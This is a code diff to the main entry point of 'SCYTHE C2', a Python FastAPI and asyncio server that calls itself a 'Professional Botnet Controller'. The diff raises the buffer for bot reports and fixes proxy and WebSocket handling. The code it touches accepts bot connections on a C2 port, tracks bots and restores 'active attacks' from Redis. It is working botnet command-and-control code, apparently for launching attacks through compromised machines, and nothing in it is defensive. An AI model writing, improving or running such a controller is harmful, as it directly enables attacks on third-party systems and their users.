@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
 SCYTHE C2 - Main Entry Point
-Version: 1.0.0 - MAXIMIZED + AUTH FIXED
-Fully synchronized with admin.html v8.1
+Version: 1.0.1 - PROXY RACE FIX + WS BROADCAST + TCP BUFFER FIX
+Fully synchronized with admin.html v8.3
 """
 
 import asyncio
@@ -196,7 +196,7 @@ async def periodic_update_broadcaster():
 async def handle_bot(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
     addr = writer.get_extra_info("peername")
     bot_id = None
-    logger.info(f"🔌 Raw bot connection from {addr}")
+    logger.info(f"Raw bot connection from {addr}")
     try:
         while True:
             try:
@@ -226,7 +226,7 @@ async def handle_bot(reader: asyncio.StreamReader, writer: asyncio.StreamWriter)
         logger.error(f"Bot connection error from {addr}: {e}")
     finally:
         if bot_id:
-            logger.info(f"🧹 Bot {bot_id} disconnecting, removing from active_writers")
+            logger.info(f"Bot {bot_id} disconnecting, removing from active_writers")
             await botnet_mgr.remove_bot_on_disconnect(bot_id)
         try:
             writer.close()
@@ -237,24 +237,26 @@ async def handle_bot(reader: asyncio.StreamReader, writer: asyncio.StreamWriter)
 
 async def start_tcp_server():
     try:
+        # FIX: Increase TCP buffer for large bot reports
         server = await asyncio.start_server(
             handle_bot,
             host="0.0.0.0",
             port=settings.C2_PORT,
-            limit=1024 * 1024
+            limit=8192 * 1024  # 8MB buffer (was 1MB)
         )
-        logger.info(f"✅ TCP Server created, about to serve on port {settings.C2_PORT}")
+        logger.info(f"TCP Server created, about to serve on port {settings.C2_PORT}")
         async with server:
             await server.serve_forever()
     except Exception as e:
-        logger.error(f"❌ Failed to start TCP server: {e}")
+        logger.error(f"Failed to start TCP server: {e}")
         raise
 
 # ========== LIFESPAN ==========
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     logger.info("=" * 70)
-    logger.info("  SCYTHE C2 v1.0.0 - Professional Botnet Controller")
+    logger.info("  SCYTHE C2 v1.0.1 - Professional Botnet Controller")
+    logger.info("  FIX: Proxy race condition, WS broadcast, TCP buffer")
     logger.info("=" * 70)
     logger.info(f"  API Port     : {settings.API_PORT}")
     logger.info(f"  C2 Port      : {settings.C2_PORT}")
@@ -267,9 +269,9 @@ async def lifespan(app: FastAPI):
     try:
         redis = await get_redis()
         await redis.ping()
-        logger.info("✅ Redis connected successfully.")
+        logger.info("Redis connected successfully.")
     except Exception as e:
-        logger.error(f"❌ Redis connection failed: {e}")
+        logger.error(f"Redis connection failed: {e}")
         sys.exit(1)
 
     # 2. Initialize managers
@@ -278,7 +280,7 @@ async def lifespan(app: FastAPI):
     await concurrent_mgr.initialize()
     try:
         await attack_mgr.restore_from_redis()
-        logger.info("✅ Restored active attacks from Redis")
+        logger.info("Restored active attacks from Redis")
     except Exception as e:
         logger.warning(f"Failed to restore attacks: {e}")
     await botnet_mgr.start()
@@ -286,15 +288,15 @@ async def lifespan(app: FastAPI):
 
     # 3. Start TCP server FIRST (so bots can connect immediately)
     tcp_task = asyncio.create_task(start_tcp_server())
-    logger.info(f"✅ TCP Bot server listening on port {settings.C2_PORT}")
+    logger.info(f"TCP Bot server listening on port {settings.C2_PORT}")
 
     # 4. Start proxy_manager background refresh (AFTER TCP server, non-blocking)
     proxy_refresh_task = asyncio.create_task(proxy_mgr.start_background_refresh())
-    logger.info("✅ Proxy background refresh started (non-blocking)")
+    logger.info("Proxy background refresh started (non-blocking)")
 
     # 5. Start periodic update broadcaster
     broadcaster_task = asyncio.create_task(periodic_update_broadcaster())
-    logger.info("✅ Periodic update broadcaster started")
+    logger.info("Periodic update broadcaster started")
 
     async def periodic_health():
         while True:
@@ -313,8 +315,8 @@ async def lifespan(app: FastAPI):
     app.state.history_manager = history_mgr
     app.state.redis = redis
 
-    logger.info("✅ All components initialized successfully.")
-    logger.info("🚀 SCYTHE C2 is ready to serve.")
+    logger.info("All components initialized successfully.")
+    logger.info("SCYTHE C2 is ready to serve.")
     logger.info("-" * 70)
 
     yield
@@ -336,8 +338,8 @@ async def lifespan(app: FastAPI):
 # ========== FASTAPI APP ==========
 app = FastAPI(
     title="SCYTHE C2 API",
-    version="1.0.0",
-    description="C2 Server for SCYTHE Botnet & Attack System",
+    version="1.0.1",
+    description="C2 Server for SCYTHE Botnet & Attack System - Proxy Race Fix",
     lifespan=lifespan
 )
 
@@ -382,7 +384,7 @@ app.include_router(auth.router)
 async def admin_websocket(websocket: WebSocket):
     await websocket.accept()
     websocket_connections.append(websocket)
-    logger.info(f"🔌 WebSocket client connected. Total: {len(websocket_connections)}")
+    logger.info(f"WebSocket client connected. Total: {len(websocket_connections)}")
     try:
         await websocket.send_json({
             "type": "connected",
@@ -417,7 +419,7 @@ async def admin_websocket(websocket: WebSocket):
     finally:
         if websocket in websocket_connections:
             websocket_connections.remove(websocket)
-        logger.info(f"🔌 WebSocket client removed. Total: {len(websocket_connections)}")
+        logger.info(f"WebSocket client removed. Total: {len(websocket_connections)}")
 
 # SSE
 @app.get("/api/stream")
@@ -571,7 +573,7 @@ async def get_info():
         pass
     return {
         "name": "SCYTHE C2",
-        "version": "1.0.0",
+        "version": "1.0.1",
         "api_port": settings.API_PORT,
         "c2_port": settings.C2_PORT,
         "max_concurrent": settings.MAX_CONCURRENT,
